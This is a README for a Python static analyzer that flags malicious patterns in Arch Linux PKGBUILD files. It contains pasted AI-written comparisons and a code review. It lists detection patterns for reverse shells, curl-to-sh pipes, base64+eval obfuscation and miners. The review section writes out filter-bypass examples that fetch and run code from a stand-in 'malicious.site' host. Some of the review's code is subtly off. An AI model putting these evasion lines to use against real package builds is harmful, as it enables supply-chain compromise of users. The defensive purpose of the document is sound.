# pkgbuild-check

A static security analyzer for Arch Linux PKGBUILD files. Checks for common
malicious patterns and verifies that recommended best practices are in place —
useful before running `makepkg` on an AUR package you haven't reviewed before.

```
  pkgbuild-check  ─  PKGBUILD
────────────────────────────────────────────────────────────────────
  Score  100/100   CLEAN
  0 critical  0 warnings  8/10 best practices

  GOOD PRACTICES FOUND
────────────────────────────────────────────────────────────────────
  ✓ Strong checksum present (b2/sha256/sha512)
  ✓ package() uses $pkgdir
  ✓ DESTDIR=$pkgdir used with make install
  ✓ HTTPS or VCS source URL
  ...
```

## What it checks

### Critical issues (red)

Patterns that strongly indicate malicious intent. A hit here means you should
not install the package without thorough manual review.

| Check | Why it matters |
|---|---|
| `curl`/`wget` piped to `sh`/`bash` | Executes untrusted remote code at build time |
| `base64` + `eval` | Classic obfuscation — hides the real payload from a quick read |
| `eval` on dynamic variables | Can silently execute arbitrary commands |
| Reverse shell patterns (`/dev/tcp`, `nc -e`, …) | Opens a backdoor to an attacker |
| Cron/systemd persistence injection | Establishes malicious persistence outside the package |
| SSH `authorized_keys` modification | Grants persistent remote access |
| `/etc/passwd` or `/etc/shadow` tampering | Creates backdoor accounts |
| `rm -rf` on system paths outside `$pkgdir` | Can destroy the host filesystem |
| Cryptocurrency miner signatures | xmrig, stratum+tcp, cpuminer, etc. |
| `LD_PRELOAD` injection outside `$pkgdir` | Hijacks library loading system-wide |
| Binary download + immediate execution | Bypasses `source()` checksum verification |

### Warnings (yellow)

Suspicious patterns that aren't necessarily malicious but warrant a closer look.

| Check | Why it matters |
|---|---|
| `SKIP` in checksum arrays | Disables integrity verification; only acceptable for VCS sources |
| `md5sums` or `sha1sums` | Cryptographically broken — prefer `b2sums`, `sha256sums`, `sha512sums` |
| Plain `http://` source URL | MITM-vulnerable even with checksums present |
| External script sourced at build time | Bypasses `source()` integrity checking |
| VCS source on `master`/`main`/`HEAD` | Fetches unreviewed, unpinned code on every build |
| `.install` script present | Runs as root post-install; review it separately |
| `chmod 777` or world-writable `o+w` | World-writable installed files are a privilege escalation risk |
| `sudo`/`su` inside build functions | Build functions must not self-escalate |

### Best practices (green / blue)

Things a well-written PKGBUILD should have. Missing items are noted but don't
affect the verdict unless combined with other issues.

- Strong checksum (`b2sums`, `sha256sums`, `sha512sums`)
- `$pkgdir` used in `package()`
- `$srcdir` or `$pkgname` used in `build()`/`prepare()`
- `DESTDIR="$pkgdir" make install` pattern
- HTTPS or VCS source URLs (no plain HTTP)
- `validpgpkeys` for upstream PGP verification
- `license=` field declared
- `$pkgver` used in source URL
- `install -Dm` for file placement
- `# Maintainer:` comment present

## Installation

No dependencies beyond Python 3 (3.6+), which is already on any Arch system.

```bash
# Clone and install
git clone https://github.com/yourname/pkgbuild-check.git
cd pkgbuild-check
chmod +x pkgbuild-check
sudo cp pkgbuild-check /usr/local/bin/
```

Or without cloning:

```bash
curl -O https://raw.githubusercontent.com/yourname/pkgbuild-check/main/pkgbuild-check
chmod +x pkgbuild-check
sudo mv pkgbuild-check /usr/local/bin/
```

## Usage

```bash
pkgbuild-check PKGBUILD              # check a file
pkgbuild-check /path/to/PKGBUILD    # any path
cat PKGBUILD | pkgbuild-check        # read from stdin
pkgbuild-check --no-color PKGBUILD  # disable colour output (for logs/CI)
pkgbuild-check --help
```

### Exit codes

| Code | Meaning |
|---|---|
| `0` | Clean — no issues found |
| `1` | Warnings only |
| `2` | Critical issues found |
| `3` | File not found or permission error |

Exit codes make it easy to gate on results in scripts:

```bash
# Only build if the PKGBUILD passes
pkgbuild-check PKGBUILD && makepkg -si
```

### Use with an AUR helper

Most AUR helpers let you drop into a shell to review the PKGBUILD before
building. You can run `pkgbuild-check` there, or add it as a pre-build hook.

Example with `yay` — use the `--editmenu` flag to open the PKGBUILD in your
editor before each build, where you can exit and run `pkgbuild-check` manually:

```bash
yay -S --editmenu <package>
```

To make this the default (edit `~/.config/yay/config.json`):

```json
{
  "editmenu": true
}
```

## Limitations

This tool does **static pattern matching only**. It cannot:

- Detect obfuscation it hasn't seen before
- Follow indirect execution paths or variable expansion chains
- Sandbox or execute the build script
- Replace a careful manual read

It is a first-pass filter, not a guarantee. Always read the PKGBUILD yourself,
especially for packages with complex build logic or multiple sources.

## Comparison to Existing Tools

AI-produced response:

Yes, several tools currently exist to analyze PKGBUILD files for security issues and structural correctness, but your tool might still fill a unique niche depending on how you designed it. Since PKGBUILDs are essentially standard Bash scripts executed by makepkg, static analysis is famously tricky. [1, 2, 3, 4, 5] 
Existing tools approach this challenge across a few different categories:
### 1. Dedicated Security Scanners [6] 

* [ks-aur-scanner](https://github.com/KiefStudioMA/ks-aur-scanner): A comprehensive security tool written in Rust. It performs pattern-based detection on over 50 malicious code signatures, checks .install scripts for sneaky persistence mechanisms, and is built specifically to intercept supply-chain attacks on the Arch User Repository (AUR). [3, 7] 
* aur-sleuth: An LLM-powered auditor that hooks into makepkg or AUR helpers. It sends the PKGBUILD text and related source files to an AI model to look for complex logic bugs or obfuscated malware that regex patterns miss. [2] 
* [Arx](https://github.com/PhilCauss/arx): A Python-based yay wrapper that acts as a secure intermediary. It checks for typosquatting variations on popular package names and scans incoming PKGBUILD strings for malicious intent before executing them. [8] 

## #2. Official Linters & Verifiers

* [namcap](https://man.archlinux.org/man/namcap.1): The official Arch Linux package analysis utility. It parses completed packages and PKGBUILDs to catch packaging errors, security smells (like insecure file permissions or unnecessary root privileges), and missing dependencies. [1, 9] 
* [archlinux-inputs-fsck](https://github.com/kpcyrd/archlinux-inputs-fsck): A strict linter designed to sanity-check PKGBUILD structures. Note that it dynamically sources files to test them, making it more of a validator than a pure sandboxed analyzer. [10] 

------------------------------
### How to see if your tool is better (or different)
To evaluate your analyzer against these, consider what technique your script uses:

| If your tool uses... [2, 3, 5, 7] | How it compares to the market |
|---|---|
| Regex / Rule-based AST | It competes with ks-aur-scanner. Check if your rule engine handles string obfuscation (e.g., eval $(echo "Y3VybA==" | base64 -d)) better than they do. |
| AI / LLM Prompts | It competes with aur-sleuth. Your script might be better if it uses local/open-source LLMs (like Ollama) or has lower latency. |
| Dynamic Sandboxing | Very few tools safely execute a PKGBUILD to watch network/system calls. If you use a tool like strace inside a container to catch curl | bash attempts at build-time, you have something highly valuable. |

If you want to share how your analyzer works—like whether it uses static patterns, an AST parser, or an LLM, and what specific vulnerabilities it looks for—I can help you audit your script's logic against the current ecosystem! [2, 3] 

[1] [https://bbs.archlinux.org](https://bbs.archlinux.org/viewtopic.php?id=183357)
[2] [https://www.reddit.com](https://www.reddit.com/r/archlinux/comments/1mqiqpc/introducing_aursleuth_an_llmpowered_security/)
[3] [https://github.com](https://github.com/KiefStudioMA/ks-aur-scanner)
[4] [https://bbs.archlinux.org](https://bbs.archlinux.org/viewtopic.php?id=268202)
[5] [https://superuser.com](https://superuser.com/questions/814959/convenient-way-to-check-aur-pkgbuild-against-malicious-code)
[6] [https://bbs.archlinux.org](https://bbs.archlinux.org/viewtopic.php?id=183357)
[7] [https://github.com](https://github.com/KiefStudioMA/ks-aur-scanner)
[8] [https://github.com](https://github.com/PhilCauss/arx)
[9] [https://man.archlinux.org](https://man.archlinux.org/man/namcap.1)
[10] [https://github.com](https://github.com/kpcyrd/archlinux-inputs-fsck)

## TODO

### Address these AI-identified issues

This is a very clean, readable, and highly practical Python linter! Your script uses regex and structured rules to effectively check for many common security anti-patterns in PKGBUILD files, including dangerous shell pipes, persistence injection, and weak cryptographic signatures.

However, because PKGBUILD files are written in Bash, relying purely on text-based regular expressions means an attacker can easily bypass your analyzer, or normal packaging choices could trigger false alarms.

------------------------------
#### 🛑 How Your Tool Can Be Bypassed (False Negatives)
Because regex looks for specific string sequences, an attacker can bypass your RED_FLAGS by slightly modifying their formatting or using standard Bash expansion.
#### 1. Simple Multi-line Bypasses
Your curl_pipe_sh regex expects everything to be on a single line with [^|#\n]*:

r"(curl|wget)\s+[^|#\n]*\|[^|#\n]*\b(bash|sh)\b"

An attacker can easily bypass this by breaking the pipeline across multiple lines using a backslash \ or using a temporary file:

curl http://malicious.site \
  | sh

#### 2. Evading the base64_eval Rule
Your base64_eval regex targets the explicit string base64:

r"base64[^|;\n]*\|\s*\beval\b|\beval\b.*base64"

Bash offers many ways to decode or execute hidden strings without using the word base64 directly. An attacker could use xxd, uudecode, or basic shell expansion to mask the string:

```
# Uses tr to decode a basic rot13 string and feeds it to eval
eval $(echo "phey bssraqre.pbz | fush" | tr 'a-za-z' 'n-za-mN-ZA-M')
```

#### 3. Missing Alternative Utilities
Your rule for bin_exec_download specifically checks for chmod, ./, or sh. An attacker could use rexx, python, perl, or even native bash to run a downloaded payload directly:

wget http://malicious.site && python script.py

------------------------------
#### ⚠️ Potential False Positives
Your rules will sometimes flag valid, safe code as dangerous, forcing the user to sort through noise.
#### 1. http_source vs. Array Elements
Your http_source rule checks if a plain HTTP URL exists inside the source array:

r'source\s*=\s*\([^)]*http://'

If a package defines multiple sources where the first three are https:// but the fourth is http://, the [^)]* regex anchor might break or incorrectly parse multi-line arrays depending on how the brackets are formatted.

#### 2. Systemd Services

Your cron_persist rule flags /etc/cron or cron.d/. However, some legitimate packages genuinely need to ship system configurations. If a package installs a cron system-wide, it usually places it inside $pkgdir/etc/cron.d/. Because your regex simply scans for the string /etc/cron, it will generate a false positive even when the path is safely isolated inside $pkgdir.

------------------------------
#### 🛠️ Concrete Code Improvements
Here is how you can rewrite specific rules in your script to make them more resilient:
#### Robust curl_pipe_sh (Handling Multi-line)
Use the re.DOTALL flag or allow whitespace/newlines \s* to catch multiline pipelines:

```
# Updated regex to handle multiline pipeline breaks
"re": re.compile(
    r"(curl|wget)\s+.*?\|\s*(bash|sh)\b", 
    re.DOTALL | re.IGNORECASE
)
```

#### Context-Aware Path Tracking (Preventing False Positives)
Modify your persistence and file tampering checks to verify that the dangerous paths are not prefixed by $pkgdir or ${pkgdir}:
```
# Flags cron paths ONLY if they aren't safely targeting the staging package directory
"re": re.compile(r"(?<!\$pkgdir)(?<!\{pkgdir\})/etc/(cron|shadow|passwd)")
```

------------------------------
#### 🏁 Final Verdict: How It Stacks Up

* Compared to namcap: namcap inspects the actual built package files (compiled binaries, permissions, ELF structures). Your tool is faster for a quick text audit before compiling.
* Compared to ks-aur-scanner: ks-aur-scanner runs thousands of deeply robust rust-based AST rule definitions. Your script is simpler but easier to maintain.
* Your Unique Niche: This script is highly readable and extremely lightweight. It is perfect as a personal pre-commit hook or a local terminal utility to quickly glance over a file before running makepkg.

If you want to keep improving this tool, we could modify it to use a proper Bash AST (Abstract Syntax Tree) Parser library (like bashlex) instead of regex. Would you like to see an example of how bashlex can be used to track exact commands safely?

## Contributing

Bug reports and new check ideas are welcome as issues. If you're adding a
detection pattern, please include a minimal PKGBUILD snippet that triggers it
and one that shouldn't.

## License

MIT — see [LICENSE](LICENSE).
